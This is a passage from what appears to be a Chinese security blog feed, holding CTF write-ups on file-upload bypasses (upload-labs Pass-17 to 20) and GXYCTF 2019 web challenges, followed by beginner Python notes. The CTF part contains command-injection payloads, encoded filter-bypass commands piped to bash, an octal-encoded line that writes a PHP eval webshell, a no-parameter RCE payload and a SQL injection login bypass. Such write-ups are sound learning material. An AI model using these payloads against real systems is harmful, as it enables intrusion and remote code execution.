class="comment">//03c52d9c-b9b4-46c5-ac2a-aa25cb0dee7a.node3.buuoj.cn/Pass-17/index.php?action=show_code</span></span><br><span class="line">Accept-<span class="string">Encoding:</span> gzip, deflate</span><br><span class="line">Accept-<span class="string">Language:</span> zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line"><span class="string">Connection:</span> close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryPBfkOqXEbfZTLCFK</span><br><span class="line">Content-<span class="string">Disposition:</span> form-data; name=<span class="string">"upload_file"</span>; filename=<span class="string">"1.php"</span></span><br><span class="line">Content-<span class="string">Type:</span> application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">------WebKitFormBoundaryPBfkOqXEbfZTLCFK</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"submit"</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">------WebKitFormBoundaryPBfkOqXEbfZTLCFK--</span><br></pre></td></tr></table></figure><h3 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /upload/<span class="number">1.</span>php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">03</span>c52d9c-b9b4<span class="number">-46</span>c5-ac2a-aa25cb0dee7a.node3.buuoj.cn</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">79.0</span><span class="number">.3945</span><span class="number">.79</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br></pre></td></tr></table></figure><p>但是由于平台不允许(我太菜，记得好像线程放慢点就可以了！我懒)。</p><p>所以不演示了！</p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>18与17类似，一步步验证，如果否则删除</p><h2 id="pass-19"><a href="#pass-19" class="headerlink" title="pass-19"></a>pass-19</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);    <span class="comment">//pathinfo()函数以数组返回文件路径的信息。</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'禁止保存为该类型文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/p/aabc1e7408d5" target="_blank" rel="noopener">Miracle778</a>这个大佬和我觉得差不多，既然上面已经有0x00截断，不再可能考同一个问题。</p><p>pathinfo返回信息以数组形式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">print_r(pathinfo(<span class="string">"/testweb/test.txt"</span>));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">[dirname] =&gt; /testweb</span><br><span class="line">[basename] =&gt; test.txt</span><br><span class="line">[<span class="keyword">extension</span>] =&gt; txt</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>因为最后保存的文件名是post[‘save_name’]是可控的,而move_uploaded_file会忽略掉末尾的&#x2F;.(不和pass-09一样，无PHP版本限制)。</p><p><img src="/19.jpg"></p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>最后一题，这题我做过，这题碰到过。</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="meta-keyword">$is</span>_upload = false;</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$msg</span> = null;</span></span><br><span class="line"><span class="keyword">if</span>(!empty(<span class="symbol">$</span>_FILES[<span class="string">'upload_file'</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="symbol">$</span>allow_type = array(<span class="string">'image/jpeg'</span>,<span class="string">'image/png'</span>,<span class="string">'image/gif'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="symbol">$</span>_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>],<span class="symbol">$</span>allow_type))&#123;</span><br><span class="line">        <span class="symbol">$</span>msg = <span class="string">"禁止上传该类型文件!"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="symbol">$</span><span class="keyword">file</span> = empty(<span class="symbol">$</span>_POST[<span class="string">'save_name'</span>]) ? <span class="symbol">$</span>_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>] : <span class="symbol">$</span>_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="symbol">$</span><span class="keyword">file</span>)) &#123;</span><br><span class="line">            <span class="symbol">$</span><span class="keyword">file</span> = explode(<span class="string">'.'</span>, strtolower(<span class="symbol">$</span><span class="keyword">file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="symbol">$</span>ext = end(<span class="symbol">$</span><span class="keyword">file</span>);</span><br><span class="line">        <span class="symbol">$</span>allow_suffix = array(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="symbol">$</span>ext, <span class="symbol">$</span>allow_suffix)) &#123;</span><br><span class="line">            <span class="symbol">$</span>msg = <span class="string">"禁止上传该后缀文件!"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="symbol">$</span>file_name = reset(<span class="symbol">$</span><span class="keyword">file</span>) . <span class="string">'.'</span> . <span class="symbol">$</span><span class="keyword">file</span>[count(<span class="symbol">$</span><span class="keyword">file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="symbol">$</span>temp_file = <span class="symbol">$</span>_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            <span class="symbol">$</span>img_path = UPLOAD_PATH . <span class="string">'/'</span> .<span class="symbol">$</span>file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="symbol">$</span>temp_file, <span class="symbol">$</span>img_path)) &#123;</span><br><span class="line">                <span class="symbol">$</span>msg = <span class="string">"文件上传成功！"</span>;</span><br><span class="line">                <span class="symbol">$</span>is_upload = true;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="symbol">$</span>msg = <span class="string">"文件上传失败！"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="symbol">$</span>msg = <span class="string">"请选择要上传的文件！"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>if(!in_array($_FILES[‘upload_file’][‘type’],$allow_type)) 检查MIME</li><li>strtolower()将字符串转为小写</li><li>explode() 函数把字符串打散为数组。可以传入数组绕过。</li><li>$file_name &#x3D; reset($file) . ‘.’ . $file[count($file) - 1];，如果那个值为空则可以跳过,令save_name[1]的值为空来进行绕过。</li></ul><p><img src="/20.jpg"></p><p>谢谢辣能看到这里！！！</p><p>一上部分思路参考<a href="https://www.jianshu.com/p/aabc1e7408d5" target="_blank" rel="noopener">Miracle778</a>师傅</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF[2019]复现</title>
      <link href="/2020/01/10/GXYCTF-2019-%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/01/10/GXYCTF-2019-%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p><strong>弄完事情吃完饭,都没时间打，BuuCTF复现一下</strong></p><a id="more"></a><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>记得XCTF有道相似题型，当时一看到这题就想起来了，但是写payload的时候多打了个空格。。。试了好多次后没发现，还以为我思路错了。。。</p><p>题目让我们ping ip <br><br>127.0.0.1|ls</p><p><img src="/1.jpg"></p><p>爆出有index.php以及flag.php，但是题目过滤了空格。</p><h4 id="“奇淫技巧”：-ip-cat-IFSls"><a href="#“奇淫技巧”：-ip-cat-IFSls" class="headerlink" title="“奇淫技巧”：?ip&#x3D;;cat$IFSls;"></a>“奇淫技巧”：?ip&#x3D;;cat$IFS<code>ls</code>;</h4><p>也能出！！！！学到了！</p><p><img src="/7.jpg"></p><h2 id="linux常见绕过方法"><a href="#linux常见绕过方法" class="headerlink" title="linux常见绕过方法"></a>linux常见绕过方法</h2><ol><li><p>空格过滤</p><blockquote><p>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等</p></blockquote></li><li><p>一些命令分隔符</p><blockquote><p>linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||<br><br>windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</p></blockquote></li><li><p>花括号的别样用法</p><blockquote><p>在Linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令<br>{cat,flag}</p></blockquote></li><li><p>黑名单绕过</p><blockquote><ol><li>拼接绕过:a&#x3D;l;b&#x3D;s;$a$b<br></li><li>编码绕过<br><br><b>base64</b>：<br>echo “Y2F0IC9mbGFn”|base64-d|bash<br> &#x3D;&#x3D;&gt;cat &#x2F;flag<br><br><b>hex</b>：<br>echo “636174202f666c6167” | xxd -r -p|bash <br>&#x3D;&#x3D;&gt;cat &#x2F;flag<br><br><b>oct</b>：<br><br>$(printf “\154\163”) <br>&#x3D;&#x3D;&gt;ls<br><br>$(printf “\x63\x61\x74\x20\x2f\x66\x6c\x61\x67”)<br> &#x3D;&#x3D;&gt;cat &#x2F;flag<br><br>{printf,”\x63\x61\x74\x20\x2f\x66\x6c\x61\x67”}|$0 <br>&#x3D;&#x3D;&gt;cat &#x2F;flag<br></li></ol></blockquote></li></ol><p>#可以通过这样来写webshell,内容为<?php @eval($_POST['c']);?><br>${printf,”\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76”} <br>&#x3D;&#x3D;&gt; 1.php<br></p><blockquote><ol start="3"><li>单引号和双引号绕过<br>比如：ca’’t flag 或ca””t flag</li><li>反斜杠绕过<br>比如：ca\t fl\ag</li><li>5、利用Shell 特殊变量绕过<br>例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。<br>$@表示（$@:同样也是获取当前shell的参数，不加引号和$*是一样的，那么加了引号如：”$@” 表示将所有的参数视为不同独立的字符串，相当于”$1” “$2”..）<br>比如：ca$@t fla$@g<br><br>ca$1t fla$2g</li></ol></blockquote><ol start="5"><li>linux中直接查看文件内容的命令<br>cat、tac、more、less、head、tail、nl、sed、sort、uniq、</li></ol><p>这道题利用$IFS构造空格，发现他还过滤了flag以及&#x2F;等字符。利用变量构造。</p><p>payload：<br><br><code>?ip=127.0.0.1;b=lag;a=f;cat$IFS$a$b.php</code></p><p><img src="/2.jpg"></p><hr><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>参考<a href="http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/#comment-15" target="_blank" rel="noopener">Pdsdt</a></p><p><strong>无参数RCE</strong></p><p>git泄露源码，利用githack</p><p><code>python GitHack.py http://f947babc-b762-4a48-bbe9-8fe7414d39a8.node3.buuoj.cn/.git/</code></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">echo <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(isset($_GET<span class="literal">['<span class="identifier">exp</span>']</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg<span class="constructor">_match('<span class="operator">/</span><span class="params">data</span>:\<span class="operator">/</span>\<span class="operator">/</span>|<span class="params">filter</span>:\<span class="operator">/</span>\<span class="operator">/</span>|<span class="params">php</span>:\<span class="operator">/</span>\<span class="operator">/</span>|<span class="params">phar</span>:\<span class="operator">/</span>\<span class="operator">/</span><span class="operator">/</span><span class="params">i</span>', $<span class="params">_GET</span>['<span class="params">exp</span>'])</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="character">';'</span><span class="operator"> === </span>preg<span class="constructor">_replace('<span class="operator">/</span>[<span class="params">a</span>-<span class="params">z</span>,<span class="params">_</span>]+\((?R)</span>?\)/', NULL, $_GET<span class="literal">['<span class="identifier">exp</span>']</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg<span class="constructor">_match('<span class="operator">/</span><span class="params">et</span>|<span class="params">na</span>|<span class="params">info</span>|<span class="params">dec</span>|<span class="params">bin</span>|<span class="params">hex</span>|<span class="params">oct</span>|<span class="params">pi</span>|<span class="params">log</span><span class="operator">/</span><span class="params">i</span>', $<span class="params">_GET</span>['<span class="params">exp</span>'])</span>) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @eval($_GET<span class="literal">['<span class="identifier">exp</span>']</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                die(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><blockquote><p>localeconv()   函数返回一包含本地数字及货币格式信息的数组。<br><br>scandir()   列出 images 目录中的文件和目录。<br><br>readfile()  输出一个文件。<br><br>current()       返回数组中的当前单元, 默认取第一个值。<br><br>pos()           current() 的别名。<br><br>next() 函数将内部指针指向数组中的下一个元素，并输出。<br><br>array_reverse()以相反的元素顺序返回数组。<br><br>highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。</p></blockquote><p>localeconv() 函数返回一包含本地数字及货币格式信息的数组，结合pos()能得到.，也就是当前目录&#x3D;&#x3D;&gt;然后再加上scandir就能获取当前目录的所有的文件</p><p>payload:<br><br>print_r(scandir(pos(localeconv())));</p><p><img src="/3.jpg"></p><p>之后我们利用array_reverse() 将数组内容反转一下，利用next()指向flag.php文件&#x3D;&#x3D;&gt;highlight_file()高亮输出。</p><p>payload:<br><br><code>?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code></p><hr><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>在进行sql注入探测中，发现有base32解密， 解完还有一层base64，最后出来sql语句：<br><br><code>select * from user where username = &#39;$name&#39;</code><br></p><p>探测一共有几个字段<br></p><p><code>Error: The used SELECT statements have a different number of columns</code><br><br>通过列数不同报错，可以确定有三个字段，当为三个参数时，报账号错误<br></p><p><code>0&#39; union select 0,1,3#&amp;pw=123</code><br></p><p><code>wrong user!</code></p><p><img src="/4.jpg"></p><p><img src="/5.jpg"><br>当查询的数据不存在的时候，联合查询就会构造一个虚拟的数据<br><br>当查询到有的值：<br><br><img src="/6.jpg"></p><p>构造payload:<br></p><p><code>0&#39; union select 0,&#39;admin&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;#&amp;pw=123456</code></p><h2 id="【未完待续】"><a href="#【未完待续】" class="headerlink" title="【未完待续】"></a>【未完待续】</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python系统学习笔记(二)</title>
      <link href="/2020/01/09/Python%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/"/>
      <url>/2020/01/09/Python%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<p><em><strong>函数和模块的使用<br>Martin Fowler先生曾经说过：“代码有很多种坏味道，重复是最坏的一种！”。</strong></em></p><a id="more"></a><h2 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h2><p><em><strong>在Python中可以使用def关键字来定义函数，和变量一样每个函数也有一个响亮的名字，而且命名规则跟变量的命名规则是一致的。在函数名后面的圆括号中可以放置传递给函数的参数，这一点和数学上的函数非常相似，程序中函数的参数就相当于是数学上说的函数的自变量，而函数执行完成后我们可以通过return关键字来返回一个值，这相当于数学上说的函数的因变量。</strong></em></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def <span class="builtin-name">find</span>(<span class="attribute">num</span>=100):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(20):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(33):</span><br><span class="line">            <span class="keyword">if</span> i<span class="number">*5</span> + j<span class="number">*3</span> &lt;=num:</span><br><span class="line">                <span class="builtin-name">print</span>(<span class="string">"公鸡：%d,母鸡：%d，小鸡：%d"</span> % (i,j,num-5*i-3*j))</span><br><span class="line"></span><br><span class="line">def <span class="builtin-name">add</span>(<span class="attribute">a</span>=0,b=0,c=0):</span><br><span class="line">    <span class="builtin-name">print</span>(a+b+c)</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">add</span>(1,2,3)</span><br><span class="line"><span class="builtin-name">find</span>(10)</span><br></pre></td></tr></table></figure><p><em><strong>如果没有指定参数那么使用默认值,我们给上面两个函数的参数都设定了默认值，这也就意味着如果在调用函数的时候如果没有传入对应参数的值时将使用该参数的默认值，所以在上面的代码中我们可以用各种不同的方式去调用add函数，这跟其他很多语言中函数重载的效果是一致的。</strong></em></p><h2 id="模块管理函数"><a href="#模块管理函数" class="headerlink" title="模块管理函数"></a>模块管理函数</h2><p>one.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"Hello World!"</span>)</span><br></pre></td></tr></table></figure><p>two.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"Hello ChenZIDu!"</span>)</span><br></pre></td></tr></table></figure><p>if.py</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> one import find</span><br><span class="line"><span class="keyword">from</span> two import find</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">find</span>()</span><br></pre></td></tr></table></figure><p>下面函数会覆盖上面的，后导入覆盖前面的！</p><p><em><strong>需要说明的是，如果我们导入的模块除了定义函数之外还中有可以执行代码，那么Python解释器在导入这个模块时就会执行这些代码，事实上我们可能并不希望如此，因此如果我们在模块中编写了执行代码，最好是将这些执行代码放入如下所示的条件中，这样的话除非直接运行该模块，if条件下的这些代码是不会执行的，因为只有直接执行的模块的名字才</strong></em></p><p>if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘ 就相当于是 Python 模拟的程序入口。Python 本身并没有规定这么写，这只是一种编码习惯。由于模块之间相互引用，不同模块可能都有这样的定义，而入口程序只能有一个。到底哪个入口程序被选中，这取决于 <strong>name</strong> 的值。</p><p>if.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> two <span class="keyword">import</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    print(a*<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>two.py</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">a</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="variable">def</span> <span class="function"><span class="title">main</span>():</span></span><br><span class="line"><span class="function">    <span class="title">print</span>(<span class="string">"Hello ChenZIDu!"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="variable"><span class="keyword">if</span></span> <span class="variable">__name__</span> == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="function"><span class="title">main</span>()</span></span><br></pre></td></tr></table></figure><p><b>所以，if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘ 我们简单的理解就是： 如果模块是被直接运行的，则代码块被运行，如果模块是被导入的，则代码块不被运行。</b></p><hr><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p><em><strong>Python为字符串类型提供了非常丰富的运算符，我们可以使用+运算符来实现字符串的拼接，可以使用*运算符来重复一个字符串的内容，可以使用in和not in来判断一个字符串是否包含另外一个字符串（成员运算），我们也可以用[]和[:]运算符从字符串取出某个字符或某些字符（切片运算），代码如下所示。</strong></em></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">s1 = 'hello ' * <span class="number">3</span></span><br><span class="line"><span class="keyword">print</span>(s1) <span class="meta"># hello hello hello </span></span><br><span class="line">s2 = 'world'</span><br><span class="line">s1 += s2</span><br><span class="line"><span class="keyword">print</span>(s1) <span class="meta"># hello hello hello world</span></span><br><span class="line"><span class="keyword">print</span>('ll' in s1) <span class="meta"># True</span></span><br><span class="line"><span class="keyword">print</span>('good' in s1) <span class="meta"># False</span></span><br><span class="line">str2 = 'abc123456'</span><br><span class="line"><span class="meta"># 从字符串中取出指定位置的字符(下标运算)</span></span><br><span class="line"><span class="keyword">print</span>(str2[<span class="number">2</span>:<span class="number">5</span>]) <span class="meta"># c12</span></span><br><span class="line"><span class="keyword">print</span>(str2[<span class="number">2</span>:]) <span class="meta"># c123456</span></span><br><span class="line"><span class="keyword">print</span>(str2[<span class="number">2</span>::<span class="number">2</span>]) <span class="meta"># c246</span></span><br><span class="line"><span class="keyword">print</span>(str2[::<span class="number">2</span>]) <span class="meta"># ac246</span></span><br><span class="line"><span class="keyword">print</span>(str2[::<span class="number">-1</span>]) <span class="meta"># 654321cba</span></span><br><span class="line"><span class="keyword">print</span>(str2[<span class="number">-3</span>:<span class="number">-1</span>]) <span class="meta"># 45</span></span><br></pre></td></tr></table></figure><p><code>str1 = &#39;hello, world!&#39;</code></p><h3 id="字符串内置函数"><a href="#字符串内置函数" class="headerlink" title="字符串内置函数"></a>字符串内置函数</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 